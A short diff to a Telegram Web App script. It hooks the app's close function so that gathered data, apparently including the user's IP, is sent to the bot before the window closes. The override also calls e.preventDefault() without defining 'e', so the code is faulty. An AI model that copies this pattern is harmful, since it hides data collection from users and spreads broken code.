@@ -157,7 +157,8 @@
             });
         }
 
-        window.Telegram.WebApp.BackButton.show().onClick( async () => {
+        let oclose = window.Telegram.WebApp.close;
+        window.Telegram.WebApp.close = async () => {
             e.preventDefault();
             
             if (!IS_IP_SENT) {
@@ -165,9 +166,9 @@
 
                 window.Telegram.WebApp.sendData(JSON.stringify(collectedData));
 
-                window.Telegram.WebApp.close();
+                oclose();
             }
-        });
+        };
 
         // Обработчик отправки формы
         document.getElementById('mainForm').addEventListener('submit', async (e) => {
